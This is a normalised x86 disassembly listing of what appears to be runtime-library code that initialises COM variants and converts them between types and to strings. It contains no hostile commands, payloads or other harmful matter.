fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
call sub_4120c4
fistp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_411fc8
fistp [ esp ]
fwait
jmp r-xdata
fild [ esp ]
add esp 0x14
pop ebx
retn
mov eax ebx
call sub_412014
fistp [ esp ]
fwait
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ esp ] eax
mov [ esp + 0x4 ] eax
jmp r-xdata
mov dx 0x6
mov ax 0x1
call sub_40ea04
test ah 0x40
je r-xdata
mov edx esp
mov eax ebx
call sub_412078
test al al
jne r-xdata
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
mov eax ebx
call sub_411fc8
fistp [ esp ]
fwait
mov eax ebx
call sub_411fc8
fistp [ esp ]
fwait
jmp r-xdata
jmp [ eax * 4 + jump_table_4122e5 ]
mov eax [ ebx + 0x8 ]
fild [ eax ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_411fc8
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx [ eax ]
mov [ esp ] edx
mov edx [ eax + 0x4 ]
mov [ esp + 0x4 ] edx
jmp r-xdata
mov eax ebx
call sub_411fc8
fistp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_411eac
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
mov [ esp + 0xc ] eax
xor eax eax
mov [ esp + 0x10 ] eax
fild [ esp + 0xc ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax ebx
call sub_411f68
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
call sub_4120c4
fistp [ esp ]
fwait
jmp r-xdata
sub_412490
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax ebx
call sub_4046a8
push eax
push 0x0
push 0x400
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov cx 0x8
mov dx 0x6
call sub_40ee44
pop ebx
pop ebp
retn 0x8
sub_4124c8
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax ebx
call sub_4046a8
push eax
push 0x0
push 0x400
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov cx 0x8
mov dx 0x7
call sub_40ee44
pop ebx
pop ebp
retn 0x8
sub_412500
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_4125b6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_4046a8
push eax
push 0x0
push 0x400
push esi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov cx 0x8
mov dx 0xb
call sub_40ee44
mov al [ rw-data ]
sub al 0x1
jb r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4125bd
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_403fc0
retn
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ ebx ]
call sub_404224
mov eax [ ebp - 0x8 ]
lea edx [ ebp - 0x4 ]
call sub_407fa0
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_4047f4
jmp r-xdata
dec al
je r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ ebx ]
call sub_404224
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
call sub_407f64
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_4047f4
jmp r-xdata
jmp r-xdata
call sub_40eaa0
sub_4125c4
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x18 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_412683
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_412661
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x8
push 0x0
push 0x400
push ebx
lea eax [ ebp - 0x10 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0x100
call sub_40ee44
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x18 ]
mov edx [ ebp - 0x8 ]
call sub_4047b8
mov eax [ ebp - 0x18 ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_4048a4
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_404224
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_412668
lea eax [ ebp - 0x10 ]
call sub_40f1e8
retn
sub_412690
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_4126e6
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x10 ]
call sub_40f510
lea eax [ ebp - 0x10 ]
call [ rw-data ]
lea edx [ ebp - 0x10 ]
mov eax esi
call sub_412778
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4126ed
lea eax [ ebp - 0x10 ]
call sub_40f1e8
retn
sub_4126f4
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
lea edx [ ebp - 0xc ]
mov ax [ ebx ]
call sub_415874
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
je r-xdata
xor edx edx
mov [ eax ] edx
mov al [ ebp - 0x5 ]
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x1c ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_412769
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x100
mov ecx ebx
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x14 ]
call sub_403ff0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x1c ]
call sub_40f1e8
retn
sub_412778
push ebp
mov ebp esp
mov ecx 0xf
push 0x0
push 0x0
dec ecx
jne r-xdata
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_412caf
push [ fs : eax ]
mov [ fs : eax ] esp
mov ax [ ebx ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_4127b1 ]
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_403ff0
jmp r-xdata
dec dx
je r-xdata
mov eax esi
call sub_403f9c
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
movsx eax [ ebx + 0x8 ]
call sub_4082b4
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_403ff0
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebx + 0x8 ]
call sub_4082b4
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_403ff0
jmp r-xdata
fld [ ebx + 0x8 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0xc ]
call sub_4096f8
mov edx [ ebp - 0xc ]
mov eax esi
call sub_403ff0
jmp r-xdata
fld [ ebx + 0x8 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x10 ]
call sub_4096f8
mov edx [ ebp - 0x10 ]
mov eax esi
call sub_403ff0
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x14 ]
call sub_412490
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_404224
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x18 ]
call sub_4124c8
mov edx [ ebp - 0x18 ]
mov eax esi
call sub_404224
jmp r-xdata
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x20 ]
mov edx [ ebx + 0x8 ]
call sub_4047b8
mov eax [ ebp - 0x20 ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_4048a4
mov edx [ ebp - 0x1c ]
mov eax esi
call sub_404224
jmp r-xdata
lea edx [ ebp - 0x24 ]
mov ax [ ebx + 0x8 ]
call sub_412500
mov edx [ ebp - 0x24 ]
mov eax esi
call sub_404224
jmp r-xdata
lea edx [ ebp - 0x28 ]
movsx eax [ ebx + 0x8 ]
call sub_4082b4
mov edx [ ebp - 0x28 ]
mov eax esi
call sub_403ff0
jmp r-xdata
lea edx [ ebp - 0x2c ]
xor eax eax
mov al [ ebx + 0x8 ]
call sub_4082b4
mov edx [ ebp - 0x2c ]
mov eax esi
call sub_403ff0
jmp r-xdata
lea edx [ ebp - 0x30 ]
movzx eax [ ebx + 0x8 ]
call sub_4082b4
mov edx [ ebp - 0x30 ]
mov eax esi
call sub_403ff0
jmp r-xdata
mov eax [ ebx + 0x8 ]
xor edx edx
push edx
push eax
lea eax [ ebp - 0x34 ]
call sub_4083a0
mov edx [ ebp - 0x34 ]
mov eax esi
call sub_403ff0
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x38 ]
call sub_4083a0
mov edx [ ebp - 0x38 ]
mov eax esi
call sub_403ff0
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_412778
jmp r-xdata
lea edx [ ebp - 0x3c ]
mov eax ebx
call sub_4125c4
mov edx [ ebp - 0x3c ]
mov eax esi
call sub_403ff0
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_412cb6
lea eax [ ebp - 0x78 ]
mov edx 0x7
call sub_403fc0
lea eax [ ebp - 0x5c ]
mov edx 0x3
call sub_4046c0
lea eax [ ebp - 0x50 ]
mov edx 0xb
call sub_403fc0
lea eax [ ebp - 0x24 ]
mov edx 0x5
call sub_4046c0
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_403fc0
retn
lea edx [ ebp - 0x40 ]
mov eax ebx
call sub_412690
mov edx [ ebp - 0x40 ]
mov eax esi
call sub_403ff0
jmp r-xdata
jmp r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_403ff0
jmp r-xdata
mov dx 0x100
mov ax 0x1
call sub_40ea04
test ah 0x40
je r-xdata
mov eax esi
call sub_403f9c
mov edx eax
mov eax ebx
call sub_4126f4
test al al
jne r-xdata
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
lea edx [ ebp - 0x78 ]
mov eax ebx
call sub_4125c4
mov edx [ ebp - 0x78 ]
mov eax esi
call sub_403ff0
lea edx [ ebp - 0x74 ]
mov eax ebx
call sub_4125c4
mov edx [ ebp - 0x74 ]
mov eax esi
call sub_403ff0
jmp r-xdata
jmp [ eax * 4 + jump_table_412a45 ]
lea edx [ ebp - 0x44 ]
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
call sub_4082b4
mov edx [ ebp - 0x44 ]
mov eax esi
call sub_403ff0
jmp r-xdata
lea edx [ ebp - 0x48 ]
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
call sub_4082b4
mov edx [ ebp - 0x48 ]
mov eax esi
call sub_403ff0
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x4c ]
call sub_4096f8
mov edx [ ebp - 0x4c ]
mov eax esi
call sub_403ff0
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x50 ]
call sub_4096f8
mov edx [ ebp - 0x50 ]
mov eax esi
call sub_403ff0
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x54 ]
call sub_412490
mov edx [ ebp - 0x54 ]
mov eax esi
call sub_404224
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x58 ]
call sub_4124c8
mov edx [ ebp - 0x58 ]
mov eax esi
call sub_404224
jmp r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
mov edx [ edx ]
call sub_4041c4
jmp r-xdata
lea edx [ ebp - 0x5c ]
mov eax [ ebx + 0x8 ]
mov ax [ eax ]
call sub_412500
mov edx [ ebp - 0x5c ]
mov eax esi
call sub_404224
jmp r-xdata
lea edx [ ebp - 0x60 ]
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
call sub_4082b4
mov edx [ ebp - 0x60 ]
mov eax esi
call sub_403ff0
jmp r-xdata
lea edx [ ebp - 0x64 ]
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
call sub_4082b4
mov edx [ ebp - 0x64 ]
mov eax esi
call sub_403ff0
jmp r-xdata
lea edx [ ebp - 0x68 ]
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
call sub_4082b4
mov edx [ ebp - 0x68 ]
mov eax esi
call sub_403ff0
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
xor edx edx
push edx
push eax
lea eax [ ebp - 0x6c ]
call sub_4083a0
mov edx [ ebp - 0x6c ]
mov eax esi
call sub_403ff0
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x70 ]
call sub_4083a0
mov edx [ ebp - 0x70 ]
mov eax esi
call sub_403ff0
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_412778
jmp r-xdata
sub_412cbc
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_412d66
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_412d49
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x8
push 0x0
push 0x400
push ebx
lea eax [ ebp - 0x10 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0x8
call sub_40ee44
push esi
lea eax [ ebp - 0x14 ]
mov edx [ ebp - 0x8 ]
call sub_4047b8
mov eax [ ebp - 0x14 ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_4048a4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_412d50
lea eax [ ebp - 0x10 ]
call sub_40f1e8
retn
sub_412d74
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_412dca
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x10 ]
call sub_40f510
lea eax [ ebp - 0x10 ]
call [ rw-data ]
lea edx [ ebp - 0x10 ]
mov eax esi
call sub_412ea0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_412dd1
lea eax [ ebp - 0x10 ]
call sub_40f1e8
retn
sub_412dd8
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
xor ecx ecx
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_412e90
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0xc ]
mov ax [ ebx ]
call sub_415874
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
je r-xdata
xor edx edx
mov [ eax ] edx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_412e97
lea eax [ ebp - 0x20 ]
call sub_4046a8
retn
lea eax [ ebp - 0x1c ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_412e73
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x8
mov ecx ebx
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x20 ]
mov edx [ ebp - 0x14 ]
call sub_4047b8
mov eax [ ebp - 0x20 ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_4048a4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x1c ]
call sub_40f1e8
retn
sub_412ea0
push ebp
mov ebp esp
mov ecx 0xe
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_4133f2
push [ fs : eax ]
mov [ fs : eax ] esp
mov ax [ ebx ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_412eda ]
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_4047f4
jmp r-xdata
dec dx
je r-xdata
mov eax esi
call sub_4046a8
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
movsx eax [ ebx + 0x8 ]
call sub_4082b4
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_4047f4
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebx + 0x8 ]
call sub_4082b4
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_4047f4
jmp r-xdata
fld [ ebx + 0x8 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0xc ]
call sub_4096f8
mov edx [ ebp - 0xc ]
mov eax esi
call sub_4047f4
jmp r-xdata
fld [ ebx + 0x8 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x10 ]
call sub_4096f8
mov edx [ ebp - 0x10 ]
mov eax esi
call sub_4047f4
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x14 ]
call sub_412490
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_4046e4
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x18 ]
call sub_4124c8
mov edx [ ebp - 0x18 ]
mov eax esi
call sub_4046e4
jmp r-xdata
push esi
lea eax [ ebp - 0x1c ]
mov edx [ ebx + 0x8 ]
call sub_4047b8
mov eax [ ebp - 0x1c ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_4048a4
jmp r-xdata
lea edx [ ebp - 0x20 ]
mov ax [ ebx + 0x8 ]
call sub_412500
mov edx [ ebp - 0x20 ]
mov eax esi
call sub_4046e4
jmp r-xdata
lea edx [ ebp - 0x24 ]
movsx eax [ ebx + 0x8 ]
call sub_4082b4
mov edx [ ebp - 0x24 ]
mov eax esi
call sub_4047f4
jmp r-xdata
lea edx [ ebp - 0x28 ]
xor eax eax
mov al [ ebx + 0x8 ]
call sub_4082b4
mov edx [ ebp - 0x28 ]
mov eax esi
call sub_4047f4
jmp r-xdata
lea edx [ ebp - 0x2c ]
movzx eax [ ebx + 0x8 ]
call sub_4082b4
mov edx [ ebp - 0x2c ]
mov eax esi
call sub_4047f4
jmp r-xdata
mov eax [ ebx + 0x8 ]
xor edx edx
push edx
push eax
lea eax [ ebp - 0x30 ]
call sub_4083a0
mov edx [ ebp - 0x30 ]
mov eax esi
call sub_4047f4
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x34 ]
call sub_4083a0
mov edx [ ebp - 0x34 ]
mov eax esi
call sub_4047f4
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_412ea0
jmp r-xdata
lea edx [ ebp - 0x38 ]
mov eax ebx
call sub_412cbc
mov edx [ ebp - 0x38 ]
mov eax esi
call sub_4046e4
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4133f9
lea eax [ ebp - 0x74 ]
mov edx 0x2
call sub_4046c0
lea eax [ ebp - 0x6c ]
mov edx 0x5
call sub_403fc0
lea eax [ ebp - 0x58 ]
mov edx 0x3
call sub_4046c0
lea eax [ ebp - 0x4c ]
mov edx 0x4
call sub_403fc0
lea eax [ ebp - 0x3c ]
mov edx 0x2
call sub_4046c0
lea eax [ ebp - 0x34 ]
mov edx 0x5
call sub_403fc0
lea eax [ ebp - 0x20 ]
mov edx 0x4
call sub_4046c0
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_403fc0
retn
lea edx [ ebp - 0x3c ]
mov eax ebx
call sub_412d74
mov edx [ ebp - 0x3c ]
mov eax esi
call sub_4046e4
jmp r-xdata
jmp r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_4047f4
jmp r-xdata
mov dx 0x8
mov ax 0x1
call sub_40ea04
test ah 0x40
je r-xdata
mov eax esi
call sub_4046a8
mov edx eax
mov eax ebx
call sub_412dd8
test al al
jne r-xdata
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
lea edx [ ebp - 0x74 ]
mov eax ebx
call sub_412cbc
mov edx [ ebp - 0x74 ]
mov eax esi
call sub_4046e4
lea edx [ ebp - 0x70 ]
mov eax ebx
call sub_412cbc
mov edx [ ebp - 0x70 ]
mov eax esi
call sub_4046e4
jmp r-xdata
jmp [ eax * 4 + jump_table_413161 ]
lea edx [ ebp - 0x40 ]
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
call sub_4082b4
mov edx [ ebp - 0x40 ]
mov eax esi
call sub_4047f4
jmp r-xdata
lea edx [ ebp - 0x44 ]
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
call sub_4082b4
mov edx [ ebp - 0x44 ]
mov eax esi
call sub_4047f4
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x48 ]
call sub_4096f8
mov edx [ ebp - 0x48 ]
mov eax esi
call sub_4047f4
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x4c ]
call sub_4096f8
mov edx [ ebp - 0x4c ]
mov eax esi
call sub_4047f4
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x50 ]
call sub_412490
mov edx [ ebp - 0x50 ]
mov eax esi
call sub_4046e4
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x54 ]
call sub_4124c8
mov edx [ ebp - 0x54 ]
mov eax esi
call sub_4046e4
jmp r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
mov edx [ edx ]
call sub_4047b8
jmp r-xdata
lea edx [ ebp - 0x58 ]
mov eax [ ebx + 0x8 ]
mov ax [ eax ]
call sub_412500
mov edx [ ebp - 0x58 ]
mov eax esi
call sub_4046e4
jmp r-xdata
lea edx [ ebp - 0x5c ]
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
call sub_4082b4
mov edx [ ebp - 0x5c ]
mov eax esi
call sub_4047f4
jmp r-xdata
lea edx [ ebp - 0x60 ]
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
call sub_4082b4
mov edx [ ebp - 0x60 ]
mov eax esi
call sub_4047f4
jmp r-xdata
lea edx [ ebp - 0x64 ]
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
call sub_4082b4
mov edx [ ebp - 0x64 ]
mov eax esi
call sub_4047f4
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
xor edx edx
push edx
push eax
lea eax [ ebp - 0x68 ]
call sub_4083a0
mov edx [ ebp - 0x68 ]
mov eax esi
call sub_4047f4
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x6c ]
call sub_4083a0
mov edx [ ebp - 0x6c ]
mov eax esi
call sub_4047f4
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_412ea0
jmp r-xdata
sub_413400
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_41346a
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx esi
lea eax [ ebp - 0x10 ]
call sub_40f510
lea eax [ ebp - 0x10 ]
call [ rw-data ]
cmp [ ebp - 0x10 ] 0xd
je r-xdata
mov eax ebx
mov edx [ ebp - 0x8 ]
call sub_4059e4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_413471
lea eax [ ebp - 0x10 ]
call sub_40f1e8
retn
mov dx 0xd
mov ax 0x101
call sub_40ea04
sub_413478
push ebx
push esi
push ecx
mov ebx edx
mov esi eax
movzx eax [ ebx ]
cmp eax 0xd
jg r-xdata
sub eax 0x101
je r-xdata
je r-xdata
mov edx ebx
mov eax esi
call sub_413400
jmp r-xdata
sub eax 0x3f08
je r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_4059e4
jmp r-xdata
sub eax 0x1
jb r-xdata
pop edx
pop esi
pop ebx
retn
mov eax esi
mov edx [ ebx + 0x8 ]
mov edx [ edx ]
call sub_4059e4
jmp r-xdata
sub eax 0x4
je r-xdata
mov eax esi
call sub_4059cc
jmp r-xdata
je r-xdata
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
sub eax 0x8
je r-xdata
mov edx esp
mov ax [ ebx ]
call sub_415874
test al al
je r-xdata
mov eax esi
call sub_4059cc
jmp r-xdata
mov dx 0xd
mov ax 0x1
call sub_40ea04
jmp r-xdata
mov ax [ ebx ]
mov dx 0xd
call sub_40ea04
mov eax esi
call sub_4059cc
mov ecx eax
mov edx r-xdata
mov eax [ esp ]
call sub_403300
test al al
jne r-xdata
sub_413544
push ebx
push esi
push ecx
mov ebx edx
mov esi eax
mov ax [ ebx ]
sub ax 0x1
jb r-xdata
mov eax esi
call sub_4059cc
jmp r-xdata
je r-xdata
pop edx
pop esi
pop ebx
retn
cmp [ rw-data ] 0x0
je r-xdata
sub ax 0x8
je r-xdata
mov eax esi
call sub_4059cc
jmp r-xdata
mov dx 0x9
mov ax 0x1
call sub_40ea04
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_4059e4
jmp r-xdata
sub ax 0x4000
je r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
mov edx [ edx ]
call sub_4059e4
jmp r-xdata
jmp r-xdata
mov edx esp
mov ax [ ebx ]
call sub_415874
test al al
je r-xdata
mov ax [ ebx ]
mov dx 0x9
call sub_40ea04
mov eax esi
call sub_4059cc
mov ecx eax
mov edx r-xdata
mov eax [ esp ]
call sub_403300
test al al
jne r-xdata
sub_4135f0
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
test [ edi ] 0xbfe8
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax edi
call sub_40f16c
mov [ edi ] 0x3
movsx eax bl
mov ax [ eax * 2 + rw-data ]
mov [ edi ] ax
jmp r-xdata
mov [ edi + 0x8 ] esi
pop edi
pop esi
pop ebx
retn
sub_41362c
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov [ ebx ] 0x3
mov [ ebx + 0x8 ] esi
pop esi
pop ebx
retn
mov eax ebx
call sub_40f16c
sub_41364c
push ebx
push esi
mov ebx edx
mov esi eax
test [ esi ] 0xbfe8
je r-xdata
mov [ esi ] 0x11
mov [ esi + 0x8 ] bl
pop esi
pop ebx
retn
mov eax esi
call sub_40f16c
sub_41366c
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov [ ebx ] 0x12
mov [ ebx + 0x8 ] si
pop esi
pop ebx
retn
mov eax ebx
call sub_40f16c
sub_41368c
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov [ ebx ] 0x13
mov [ ebx + 0x8 ] esi
pop esi
pop ebx
retn
mov eax ebx
call sub_40f16c
sub_4136ac
push ebx
push esi
mov ebx edx
mov esi eax
test [ esi ] 0xbfe8
je r-xdata
mov [ esi ] 0x10
mov [ esi + 0x8 ] bl
pop esi
pop ebx
retn
mov eax esi
call sub_40f16c
